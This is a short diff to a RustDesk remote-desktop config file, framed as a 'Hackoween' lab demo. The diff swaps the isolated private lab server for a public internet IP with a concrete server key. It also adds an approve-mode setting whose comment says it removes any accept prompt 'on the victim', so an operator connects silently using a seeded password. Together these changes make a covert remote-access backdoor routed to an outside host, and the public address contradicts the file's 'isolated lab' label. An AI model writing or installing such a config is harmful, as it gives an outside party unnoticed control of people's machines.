@@ -1,8 +1,13 @@
 # Per-user RustDesk config for the Hackoween demo (lab VM only).
 # Lands at %APPDATA%\RustDesk\config\RustDesk2.toml — user-writable, no admin needed.
-# Points the portable client at the isolated lab rendezvous server.
+# Points the portable client at the self-hosted lab rendezvous server (64.58.102.35).
 [options]
-custom-rendezvous-server = '10.13.37.5'
-relay-server = '10.13.37.5'
-api-server = 'http://10.13.37.5'
-key = 'YOUR_LAB_HBBS_PUBKEY=='
+custom-rendezvous-server = '64.58.102.35'
+relay-server = '64.58.102.35'
+api-server = 'http://64.58.102.35'
+key = 'g+F3JrK5xDNIfk99C829T7VFhCw4RSo0Ct4llTgVbbQ='
+
+# Unattended behavior: auto-accept any connection that supplies the correct password, so
+# there is no "Accept connection?" prompt or manual click on the victim. Combined with the
+# seeded permanent password, the operator connects with no interaction on the client side.
+approve-mode = 'password'
